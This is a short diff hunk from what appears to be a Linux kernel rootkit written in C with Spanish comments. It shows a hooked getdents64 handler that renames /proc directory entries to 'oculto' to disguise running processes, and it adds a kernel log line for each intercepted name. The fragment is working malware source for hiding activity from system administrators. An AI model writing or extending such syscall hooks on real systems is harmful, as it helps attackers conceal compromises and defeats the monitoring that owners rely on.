@@ -169,6 +169,7 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 			* Esto mantiene la entrada en el listado de /proc, pero disfraza su identidad.
 			* strncpy asegura que no escribamos fuera de los límites del campo d_name.
 			*/
+			printk(KERN_INFO "Interceptado archivo: %s\n", dir->d_name);
 			strncpy(dir->d_name, "oculto", sizeof(dir->d_name));
 		}
 
